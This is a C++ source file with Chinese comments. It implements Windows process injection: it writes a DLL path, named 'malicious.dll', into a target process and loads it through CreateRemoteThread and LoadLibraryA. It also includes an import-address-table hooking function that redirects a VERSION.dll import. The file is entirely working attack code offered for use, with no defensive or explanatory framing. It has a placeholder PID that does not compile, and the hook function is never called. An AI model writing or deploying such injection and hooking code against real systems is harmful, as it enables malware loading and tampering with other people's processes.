#include <windows.h>
#include <iostream>

void HijackIAT(HMODULE hModule, const char* targetFunction, void* newFunction) {
    // 获取PE头
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);

    // 获取IAT
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    // 遍历IAT
    while (pImportDesc->Name) {
        PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc->FirstThunk);
        while (pThunk->u1.Function) {
            FARPROC* pFunc = (FARPROC*)&pThunk->u1.Function;
            if (*pFunc == GetProcAddress(GetModuleHandleA("VERSION.dll"), targetFunction)) {
                DWORD oldProtect;
                VirtualProtect(pFunc, sizeof(FARPROC), PAGE_EXECUTE_READWRITE, &oldProtect);
                *pFunc = (FARPROC)newFunction;
                VirtualProtect(pFunc, sizeof(FARPROC), oldProtect, &oldProtect);
                return;
            }
            pThunk++;
        }
        pImportDesc++;
    }
}

int main() {
    // 目标进程ID
    DWORD pid = 目标进程PID;
    // DLL路径
    const char* dllPath = "C:\\path\\to\\malicious.dll";

    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "无法打开目标进程" << std::endl;
        return 1;
    }

    // 在目标进程中分配内存
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteBuf == NULL) {
        std::cerr << "无法在目标进程中分配内存" << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // 将DLL路径写入目标进程的内存
    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
        std::cerr << "无法将DLL路径写入目标进程的内存" << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 创建远程线程加载DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteBuf, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "无法创建远程线程" << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 等待远程线程结束
    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "DLL注入成功" << std::endl;
    return 0;
}
